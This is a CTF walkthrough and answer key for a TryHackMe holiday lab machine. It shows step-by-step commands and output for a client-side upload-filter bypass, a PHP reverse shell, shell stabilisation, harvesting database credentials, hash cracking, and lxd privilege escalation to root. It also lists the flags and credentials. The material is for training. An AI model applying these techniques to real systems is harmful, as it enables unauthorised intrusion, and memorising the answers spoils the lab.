DAY 24 - THE TRIAL BEFORE CHRISTMAS [FINAL CHALLENGE]
---- 

# STORY :
----

>>It was the night before Christmas and The Best Festival Company could finally rest. All of the toys had been made and the company had recovered from attack after attack. Everything was in Santa's hands now, leaving the elves to do little more than wish him a safe journey ahead. Elf McEager sat at his terminal staring absentmindedly at light snow that had begun to fall. Just as he had drifted off to sleep Elf McEager was jolted to attention as a small parcel appeared just at the edge of his view. 
>>The present was wrapped in a deep blue velvet that appeared to shimmer in and out of the firelight, not unlike a blinking terminal prompt. Carefully, Elf McEager reached for the azure ribbon, untying it slowly so as to not damage it. The velvet slowly fell away, revealing a small NUC computer with a letter on top. Unfolding the letter, Elf McEager read it aloud:
>>"Elf McEager - your boundless effort to save Christmas this year has not gone unnoticed. I wanted to reward you with a special present, however, there's a catch. Elf McSkidy and I have seen your skills advance and we feel it would only be appropriate to give you a present after one last challenge. Inside this package, you'll have also found a computer. Plug this into the network and hack into it. Best of luck and Merry Christmas - Santa"
>>Without delay, Elf McEager connected the NUC appropriately and watched it whir to life. A small screen nearby the power button blinked and then displayed the IP address assigned to the device. Next to the IP, a small symbol appeared. McEager quietly wondered to himself what it could mean as he logged into his terminal, ready to start his final challenge. 

----

# TASKS :
----

## Client-Side Filters:

>>Way back in Day 2 we looked at how to bypass a server-side filter around a file-upload function. It's now time to see how to bypass a client-side filter.

>>In many ways, client-side filters are easier to bypass than their server-side equivalents as they execute on your own attacking computer -- putting them under the control of an attacker. For this reason, client-side filters should never be used as the sole security measure for the file upload functionality on a website.

>>So, how would we bypass a client-side filter? The easiest way is by using BurpSuite to intercept the JavaScript code file containing the filter before it ever actually reaches our browser, then either drop the file entirely or remove the filter from the code.

>>Opening a new BurpSuite project, the first thing we have to do is navigate to the "Proxy" tab, then the "Options" subsection:

>>By default BurpSuite does not intercept JavaScript files when proxying traffic, so we need to enable this feature before we can start deleting any client-side filters. To do this, we navigate to the "Intercept Client Requests" section, click on the top line (highlighted below), then click edit:

>>This will give us the option to edit the condition. Find and remove the |^js$ in the condition, then save the filter:

>>Next, go to the "Intercept Server Responses" section and select the "Intercept responses based on the following rules" checkbox:

>>This will now intercept all responses from the server, including the JavaScript files!

>>Now you can reload the upload page by pressing Ctrl + F5 (Note that this must be done with a hard refresh to prevent 304 Not Modified responses), proxying through BurpSuite. Keep an eye on the responses as they come back -- if one is called filter.js, it would probably be a good idea to drop it!

>>If you use Mac, the equivalent sequence for a hard refresh is Preferences -> Clear History, then Control + R.

## Shell Upgrading and Stabilization:

>>You will be familiar with reverse shells from previous tasks or rooms; however, the shells you have been taught so far have had several fatal flaws. For example, pressing Ctrl + C killed the shell entirely. You could not use the arrow keys to see your shell history, and TAB autocompletes didn’t work. Stabilizing shells is an important skill to learn as it fixes all of these problems, providing a much nicer working environment.

>>Working inside the reverse shell:
   1. The first thing to do is use python3 -c 'import pty;pty.spawn("/bin/bash")', which uses Python to spawn a better-featured bash shell. At this point, our shell will look a bit prettier, but we still won’t be able to use tab autocomplete or the arrow keys, and Ctrl + C will still kill the shell.
   2. Step two is: export TERM=xterm – this will give us access to term commands such as clear.
   3. Finally (and most importantly) we will background the shell using Ctrl + Z. Back in our own terminal we use stty raw -echo; fg. This does two things: first, it turns off our own terminal echo (which gives us access to tab autocompletes, the arrow keys, and Ctrl + C to kill processes). It then foregrounds the shell, thus completing the process.

>>Note that if the shell dies, any input in your own terminal will not be visible (as a result of having disabled terminal echo). To fix this, type reset and press enter.

## Your New Best Friend - The MySQL Client:

>>Databases are used by virtually every web application on the planet to some extent or another. For this reason it’s important that we know how to access them manually. One of the most common database servers available is MySQL (or its free fork: MariaDB, which uses identical syntax and is accessed in exactly the same way). This can be accessed manually using the mysql client. There’s a catch though – exposing a database publicly is a very bad idea, so, whilst it is possible to connect to a database remotely from your attacking machine using the MySQL client, we will be focussing on connecting to a database running locally.

>>To access a database using the MySQL client, we would use the following syntax:
mysql -uUSERNAME -p
>>This tells the client to connect to the local database using a username of USERNAME (Note the lack of space between the switch -u and the value!), using a password which it will ask us to enter when we run the command.

>>Having entered the password, we will be confronted with a prompt which looks something like this:

>>Note that this will look slightly different depending on whether it’s a MySQL server or a MariaDB server.

>>The next thing we should do is use the show databases; command to see the databases available:

>>In this screenshot, the top three databases are default for a MySQL/MariaDB installation. Any others are not.

>>Let’s take a look at the top_secret database.

>>To enter the database we use the use DATABASE; command, where DATABASE is the name of the target DB. We can then show all the tables in the database with show tables;

>>In this screenshot there is only one table: users.

>>Let’s dump the users table. To do this we use the SQL command: SELECT * FROM users;.

>>We now have a username and a password we can look at cracking!

## Online Password Cracking:

>>In the modern age of password cracking, weak passwords can often be cracked without any cracking at all! Many websites now exist with the sole goal of hosting rainbow tables - tables of previously cracked passwords. This allows us more than often to simply input a password hash and nearly instantly receive the cracked password. Some various sites that I find myself (Dark) commonly using, especially throughout the case of CTFs, include the following:
- https://crackstation.net/ 
- https://md5decrypt.net/en/ 
- https://hashes.com/en/decrypt/hash 

## Privilege Escalation with LXD:

>>Among the more curious privilege escalation methods on Linux, lxd is certainly a mind-bender, to say the least. This technique involves leveraging a flaw in lxd, a program that we can use to spin up containers much akin to Docker. This exploit specifically involves abusing mount points to mount volumes from our victim machine (the machine we're attacking) within a container that we shouldn't be able to access/read. However, we have root powers on lxd containers - thus allowing us to bypass the read permission checks and escalate our privileges. We can perform this privesc method via the following steps:

 1. First, we need to check and see if our user is a member of the lxd group. We can do this with the command: id
    * We can see in this case that the user is a member of the lxd group. Note, images from this section are from the source linked at the end with regards to additional information. 
 2. Typically, this privesc can be a bit of a drawn-out process, however, in our case, we'll be able to skip part of the way through. To perform it properly, we have to perform the following steps.:
 1.Steps to be performed on the attacking machine:
    * Download build-alpine on your local machine via the git repository
	* Execute the script "build -alpine" that will build the latest Alpine image as a compressed file. This must be executed by the root user.
	* Transfer this newly created tar file to the victim machine
    
 2.Steps to be performed on the victim machine:
	* Download the alpine image
	* Import image for lxd
	* Initialize the image inside a new container <- Worth checking the already imported/available images as you may be able to skip to this step
	* Mount the container inside the /root directory  

 3. For the sake of this example, we'll be skipping close to the end (see the bolded bit above) by checking what images are readily available on the machine in question. We can do that via the following command: lxc image list   

 4. Now for the fun bit. Next, we'll run a series of commands which initialize, configure the disks, and start the container. Image name needs to match up with the imported image we'll be using. In the case of the image above, that'd be the myimage alias previously assigned to it. The container name and device name are whatever your heart desires. In my example, I'm naming my container strongbad and the device trogdor.

```bash
lxc init IMAGENAME CONTAINERNAME -c security.privileged=true
	Ex: lxc init myimage strongbad -c security.privileged=true


lxc config device add CONTAINERNAME DEVICENAME disk source=/ path=/mnt/root recursive=true
	Ex: lxc config device add strongbad trogdor disk source=/ path=/mnt/root recursive=true


lxc start CONTAINERNAME
	Ex: lxc start strongbad


lxc exec CONTAINERNAME /bin/sh
	Ex: lxc exec strongbad /bin/sh


We'll then run just a few more commands to mount our storage and verify we've escalated to root:

id
cd /mnt/root/root
```

>>And that's it! If that was a bit of a mind-bender, I highly recommend checking out the resource provided below. 

----

# MY DOCUMENTATION :
----

>>USING NMAP TO DISCOVER THE OPEN PORTS.

```bash
root@ip-10-10-138-160:~# nmap -sV -sC 10.10.36.213

Starting Nmap 7.60 ( https://nmap.org ) at 2021-11-24 14:59 GMT
Nmap scan report for ip-10-10-36-213.eu-west-1.compute.internal (10.10.36.213)
Host is up (0.0016s latency).
Not shown: 998 closed ports
PORT      STATE SERVICE VERSION
80/tcp    open  http    Apache httpd 2.4.29 ((Ubuntu))
|_http-server-header: Apache/2.4.29 (Ubuntu)
|_http-title: Site doesn't have a title (text/html).
65000/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
| http-cookie-flags: 
|   /: 
|     PHPSESSID: 
|_      httponly flag not set
|_http-server-header: Apache/2.4.29 (Ubuntu)
|_http-title: Light Cycle
MAC Address: 02:D7:6B:92:E0:F5 (Unknown)

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 16.22 seconds
```

>>USING GOBUSTER TO FIND HIDDEN DIRECTORIES

```bash
root@ip-10-10-225-197:~# gobuster dir -u http://10.10.73.143:65000 -x php -w /usr/share/wordlists/dirbuster/directory-list-2.3-small.txt 
===============================================================
Gobuster v3.0.1
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@_FireFart_)
===============================================================
[+] Url:            http://10.10.73.143:65000
[+] Threads:        10
[+] Wordlist:       /usr/share/wordlists/dirbuster/directory-list-2.3-small.txt
[+] Status codes:   200,204,301,302,307,401,403
[+] User Agent:     gobuster/3.0.1
[+] Extensions:     php
[+] Timeout:        10s
===============================================================
2020/12/26 04:48:03 Starting gobuster
===============================================================
/index.php (Status: 200)
/uploads.php (Status: 200)
/assets (Status: 301)
/api (Status: 301)
/grid (Status: 301)
===============================================================
2020/12/26 04:48:22 Finished
===============================================================
```

>>COPYING THE REVERSE SHELL TO CURRENT DIRECTORY AND RENAMED IT AS "SHELL.JPG.PHP" ,WE NAME "JPG.PHP" BECAUSE THESE IS THE SUPPORTED FILE EXTENSION BY THE WEBSITE.

```bash
cp /usr/share/webshells/php/php-reverse-shell.php ./shell.jpg.php
```

NOTE: KEEP THE BURP PROXY ON UNTIL YOU SEE THE UPLOADED REVERSE SHELL IN THE GRINCH. 

>>USE BURP SUITE TO CAPTURE THE TRAFFIC WHILE NAVIGATING TO THE UPLOADS.PHP FROM 
http://GIVEN_IP:65000/

```REQUEST_CAPTURED_WHILE_NAVIGATING_TO_UPLOADS.PHP
HTTP/1.1 200 OK
Date: Thu, 25 Nov 2021 14:44:20 GMT
Server: Apache/2.4.29 (Ubuntu)
Vary: Accept-Encoding
Content-Length: 1328
Connection: close
Content-Type: text/html; charset=UTF-8

<!DOCTYPE html>
<html lang=en>
	<head>
		<title>Aperture Clear?</title>
		<meta charset="utf-8">
		<meta name="viewport" content="width=device-width, initial-scale=1.0">
		<link rel="icon" type="image/png" href="favicon.png">
		<link rel="stylesheet" type="text/css" href="assets/css/CourierPrime.css">
		<link rel="stylesheet" type="text/css" href="assets/css/uploads.css">
		<script src="assets/js/filter.js"></script>
		<script src="assets/js/upload.js"></script>
	</head>
	<body>
		<input id="uploadInput" type=file accept=".png,.jpg,.jpeg">
		<div id="arrow">
			<table border=0 cellspacing=0 cellpadding=0>
				<tbody>
					<tr>
						<td id="leftMost"><img src="assets/imgs/shapes/left-most.png"></td>
						<td id="leftMostAngled"><img src="assets/imgs/shapes/left-most-angled.png"></td>
						<td id="middleBar">
							<img src="assets/imgs/shapes/middle-bar.png">
							<div class="resMsg" id="resMsg">&nbsp;</div>
						</td>
						<td id="rightAngled"><img src="assets/imgs/shapes/right-angled.png"></td>
						<td id="uploadBtn" class="uploadBtn"><img id="uploadImg" src="assets/imgs/upload-button.png"></td>
					</tr>
				</tbody>
			</table>
		</div>
		<!--Mobile-->
		<img class="uploadBtn" id="mobUploadBtn" src="assets/imgs/upload-button.png">
		<p class="resMsg" id="mobResMsg">&nbsp;</p>
	</body>
</html>
```

>>TO UPLOAD THE REVERSE SHELL WE NEED TO BYPASS THE FILTER SO WE NEED TO MODIFY THE SOURCE CODE OF THE UPLOADS.PHP.
>>FIRST CAPTURE THE TRAFFIC TRAFFIC AND RIGHT CLICK AND SELECT THE OPTION OF "DO INTERCEPT" AND HIT FORWARD NOW WE GOT THE SOURCE CODE AS RESPONSE.NOW GO AHEAD AND REMOVE FILTER.JS THEN FORWARD IT.  
>>NOW GO TO THE WEBSITE AND VISIT THE SOURCE CODE AND CONFIRM THAT FILTER.JS IS NOT THERE.

```MODIFIED_REQUEST_[FILTER.JS]_IS_REMOVED
HTTP/1.1 200 OK
Date: Thu, 25 Nov 2021 14:44:20 GMT
Server: Apache/2.4.29 (Ubuntu)
Vary: Accept-Encoding
Content-Length: 1328
Connection: close
Content-Type: text/html; charset=UTF-8

<!DOCTYPE html>
<html lang=en>
	<head>
		<title>Aperture Clear?</title>
		<meta charset="utf-8">
		<meta name="viewport" content="width=device-width, initial-scale=1.0">
		<link rel="icon" type="image/png" href="favicon.png">
		<link rel="stylesheet" type="text/css" href="assets/css/CourierPrime.css">
		<link rel="stylesheet" type="text/css" href="assets/css/uploads.css">
		<script src="assets/js/upload.js"></script>
	</head>
	<body>
		<input id="uploadInput" type=file accept=".png,.jpg,.jpeg">
		<div id="arrow">
			<table border=0 cellspacing=0 cellpadding=0>
				<tbody>
					<tr>
						<td id="leftMost"><img src="assets/imgs/shapes/left-most.png"></td>
						<td id="leftMostAngled"><img src="assets/imgs/shapes/left-most-angled.png"></td>
						<td id="middleBar">
							<img src="assets/imgs/shapes/middle-bar.png">
							<div class="resMsg" id="resMsg">&nbsp;</div>
						</td>
						<td id="rightAngled"><img src="assets/imgs/shapes/right-angled.png"></td>
						<td id="uploadBtn" class="uploadBtn"><img id="uploadImg" src="assets/imgs/upload-button.png"></td>
					</tr>
				</tbody>
			</table>
		</div>
		<!--Mobile-->
		<img class="uploadBtn" id="mobUploadBtn" src="assets/imgs/upload-button.png">
		<p class="resMsg" id="mobResMsg">&nbsp;</p>
	</body>
</html>
```

>>NOW UPLOAD THE REVERSE-SHELL TO THE UPLOAD.PHP .
>>GO TO BURP AND SEE CHECK FOR THIS IN THE HTTP HISTORY "/api/uploads.php" SEND IT TO REPEATER AND HIT SEND TO SEE THE RESPONSE "SUCCESFUL".

```REQUEST_CAPTURED_WHILE_UPLOADING_THE_REVERSE_SHELL_TO_THE_UPLOADS.PHP
POST /api/upload HTTP/1.1
Host: 10.10.173.195:65000
User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:80.0) Gecko/20100101 Firefox/80.0
Accept: application/json
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Referer: http://10.10.173.195:65000/uploads.php
Content-Type: text/plain;charset=UTF-8
Origin: http://10.10.173.195:65000
Content-Length: 7392
Connection: close
Cookie: PHPSESSID=93f5iu1jkdkvi2kd48sq8r1dun

{"name":"shell.jpg.php","file":"data:application/x-php;base64,
```

```RESPONSE_FOR_THE_UPLOADS
HTTP/1.1 200 OK
Date: Thu, 25 Nov 2021 14:55:47 GMT
Server: Apache/2.4.29 (Ubuntu)
Expires: Thu, 19 Nov 1981 08:52:00 GMT
Cache-Control: no-store, no-cache, must-revalidate
Pragma: no-cache
Content-Length: 53
Connection: close
Content-Type: application/json

{"res":"Success","msg":"File Uploaded Successfully!"}
```

>>AFTER THE SUCCESS RESPONSE GO TO THE GRID DIRECTORY IN THE WEBSITE TO SEE THE FILE WE UPLOADED.
>>THEN CLICK ON THAT FILE TO GET A REVERSE SHELL.

```WEB_CONTENTS_IN_THE_GRID_DIRECTORY
Index of /grid
[ICO]	Name	Last modified	Size	Description
[PARENTDIR]	Parent Directory	 	- 	 
[IMG]	shell.jpg.php	2021-11-25 14:55 	5.4K	 
Apache/2.4.29 (Ubuntu) Server at 10.10.173.195 Port 65000
```

>>WE GOT THE REVERSE SHELL ,NOW WE NEED TO STABILIZE IT USE 
" python3 -c 'import pty;pty.spawn("/bin/bash")' " 
>>THEN USE "export TERM=xterm" ,THEN HIT "CTRL+Z" TO STOP 
>>THEN NORMAL SHELL WILL APPEAR NOW USE "stty raw -echo; fg" AFTER ENTERING IT THE NETCAT SESSION START AGAIN NOW THE SHELL IS STABILISED.

```bash
root@ip-10-10-211-127:~# nc -lvnp 9001
Listening on [0.0.0.0] (family 0, port 9001)
Connection from 10.10.173.195 49092 received!
Linux light-cycle 4.15.0-128-generic #131-Ubuntu SMP Wed Dec 9 06:57:35 UTC 2020 x86_64 x86_64 x86_64 GNU/Linux
 14:57:26 up 48 min,  0 users,  load average: 0.00, 0.00, 0.01
USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
uid=33(www-data) gid=33(www-data) groups=33(www-data)
/bin/sh: 0: can't access tty; job control turned off
$ 
$ python3 -c 'import pty;pty.spawn("/bin/bash")'

www-data@light-cycle:/$ export TERM=xterm
export TERM=xterm

www-data@light-cycle:/$ ^Z
[1]+  Stopped                 nc -lvnp 9001

root@ip-10-10-211-127:~# stty raw -echo; fg
nc -lvnp 9001
```

>>GO TO "/var/www" TO GET THE web.txt AND GO TO THE "TheGrid" DIRECTORY AND LIST THE CONTENTS GO TO "includes" AND LIST THE CONTENTS AND CAT THE "dbauth.php" TO GET THE MYSQL CREDS.

```bash
www-data@light-cycle:/var/www$ ls
ENCOM  TheGrid	web.txt
www-data@light-cycle:/var/www$ cat web.txt 
THM{ENTER_THE_GRID}
www-data@light-cycle:/var/www/TheGrid$ ls
includes  public_html  rickroll.mp4
www-data@light-cycle:/var/www/TheGrid/includes$ ls
apiIncludes.php  dbauth.php  login.php	register.php  upload.php
www-data@light-cycle:/var/www/TheGrid/includes$ cat dbauth.php 
<?php
	$dbaddr = "localhost";
	$dbuser = "tron";
	$dbpass = "IFightForTheUsers";
	$database = "tron";

	$dbh = new mysqli($dbaddr, $dbuser, $dbpass, $database);
	if($dbh->connect_error){
		die($dbh->connect_error);
	}
?>
```

>>USE THOSE CREDS TO LOGIN TO THE MYSQL SERVER.USE "show databases;" COMMAND TO SEE WHAT ARE THE DATABASES IN THE SERVER.THEN "use tron" TO USE THAT DATABASE, THEN USE "show tables" TO SEE WHAT ARE THE TABLES AVAILABLE IN THE DATABASE.NOW USE "SELECT * FROM users" THIS SQL QUERY TO GET THE INFO IN THE USERS IN THE TABLE.DECODE THE MD5 HASH TO GET PASSWORD TO LOGIN WITH THE USER "FLYNN".  

```
www-data@light-cycle:/var/www/TheGrid/includes$ mysql -utron -p 
Enter password: 
Welcome to the MySQL monitor.  Commands end with ; or \g.
Your MySQL connection id is 4
Server version: 5.7.32-0ubuntu0.18.04.1 (Ubuntu)

Copyright (c) 2000, 2020, Oracle and/or its affiliates. All rights reserved.

Oracle is a registered trademark of Oracle Corporation and/or its
affiliates. Other names may be trademarks of their respective
owners.

Type 'help;' or '\h' for help. Type '\c' to clear the current input statement.

mysql> 
mysql> show databases;
+--------------------+
| Database           |
+--------------------+
| information_schema |
| tron               |
+--------------------+
2 rows in set (0.00 sec)

mysql> use tron
Reading table information for completion of table and column names
You can turn off this feature to get a quicker startup with -A

Database changed
mysql> show tables;
+----------------+
| Tables_in_tron |
+----------------+
| users          |
+----------------+
1 row in set (0.00 sec)

mysql> SELECT * FROM users;
+----+----------+----------------------------------+
| id | username | password                         |
+----+----------+----------------------------------+
|  1 | flynn    | edc621628f6d19a13a00fd683f5e3ff7 |
+----+----------+----------------------------------+
1 row in set (0.00 sec)
```

>>NOW SWITCH USER TO FLYNN AND THEN GO TO HOME DIRECTORY AND FLYNN DIRECTORY AND CAT THE USER.TXT.TO ESCALATE OUR PRIVELEGE AS ROOT WE NEED TO ABUSE THE GROUP "lxd".

```
www-data@light-cycle:/var/www/TheGrid/includes$ su flynn    
Password: 
flynn@light-cycle:/$ cd home
flynn@light-cycle:/home$ ls
flynn
flynn@light-cycle:/home$ cd flynn/
flynn@light-cycle:~$ ls
user.txt
flynn@light-cycle:~$ cat user.txt 
THM{IDENTITY_DISC_RECOGNISED}
flynn@light-cycle:~$ id
uid=1000(flynn) gid=1000(flynn) groups=1000(flynn),109(lxd)
```

>>USE THIS COMMAND TO "lxc image list" LIST THE IMAGES.
NOW USE "lxc init Alphine strongbad -c security.privileged=true" THIS COMMAND TO CREATE A CONTAINER IN THAT IMAGE.    
>>THEN USE "lxc config device add strongbad trogdor disk source=/ path=/mnt/root recursive=true"
THIS COMMAND TO CONFIGURE AND ADDING A DEVICE IN THAT CONTAINER AND THEN SPECIFYING THE PATH TO INSTALL IT AND SETTING RECURSIVE=TRUE.
>>AFTER ADDING THE DEVICE USE THIS "lxc start strongbad" TO START THE CONTAINER.
>>AFTER STARTING THE CONTAINER USE THIS "lxc exec strongbad /bin/sh" TO EXECUTE THAT CONTAINER AND GETTING THE SHELL.
>>AFTER GETTING THE SHELL USE "id" TO SEE THE USER ,THEN NAVIGATE TO THE /mnt/root/root TO GET THE ROOT.TXT  

```
flynn@light-cycle:~$ lxc image list
To start your first container, try: lxc launch ubuntu:18.04

+--------+--------------+--------+-------------------------------+--------+--------+------------
| ALIAS  | FINGERPRINT  | PUBLIC |          DESCRIPTION          |  ARCH  |  SIZE  |UPLOAD DATE|
+--------+--------------+--------+-------------------------------+--------+--------+------------
| Alpine | a569b9af4e85 | no     | alpine v3.12 (20201220_03:48) | x86_64 | 3.07MB | Dec 20, 
																					  						  |	2020 at 
																											  |3:51am 
																											  |	(UTC) 
+--------+--------------+--------+-------------------------------+--------+--------+------------

flynn@light-cycle:~$ lxc init Alpine strongbad -c security.privileged=true
Creating strongbad
mnt/root recursive=true
Error: Invalid devices: Disk entry is missing the required "path" property
flynn@light-cycle:~$ lxc config device add strongbad trogdor disk source=/ path=/mnt/root recursive=true
Device trogdor added to strongbad 
flynn@light-cycle:~$ lxc start strongbad
flynn@light-cycle:/$ lxc exec strongbad /bin/sh
~ # id
uid=0(root) gid=0(root)
~ # cd /mnt/root/root
/mnt/root/root # ls
root.txt
/mnt/root/root # cat root.txt
\THM{FLYNN_LIVES}

"As Elf McEager claimed the root flag a click could be heard as a small chamber on the anterior of the NUC popped open. Inside, McEager saw a small object, roughly the size of an SD card. As a moment, he realized that was exactly what it was. Perplexed, McEager shuffled around his desk to pick up the card and slot it into his computer. Immediately this prompted a window to open with the word 'HOLO' embossed in the center of what appeared to be a network of computers. Beneath this McEager read the following: Thank you for playing! Merry Christmas and happy holidays to all!"

```

----

# ANSWER THE FOLLOWING :
----

Scan the machine. What ports are open?
>>80, 65000

What's the title of the hidden website? It's worthwhile looking recursively at all websites on the box for this step. 
>>Light Cycle

What is the name of the hidden php page?
>>uploads.php

What is the name of the hidden directory where file uploads are saved?
>>grid

Bypass the filters. Upload and execute a reverse shell. 
>>No answer needed

What is the value of the web.txt flag?
>>THM{ENTER_THE_GRID}

Upgrade and stabilize your shell. 
>>No answer needed

Review the configuration files for the webserver to find some useful loot in the form of credentials. What credentials do you find? username:password
>>tron:IFightForTheUsers

Access the database and discover the encrypted credentials. What is the name of the database you find these in?
>>tron

Crack the password. What is it?
>>@computer@

Use su to login to the newly discovered user by exploiting password reuse. 
>>No answer needed

What is the value of the user.txt flag?
>>THM{IDENTITY_DISC_RECOGNISED}

Check the user's groups. Which group can be leveraged to escalate privileges? 
>>lxd

Abuse this group to escalate privileges to root.
>>No answer needed

What is the value of the root.txt flag?
>>THM{FLYNN_LIVES}

----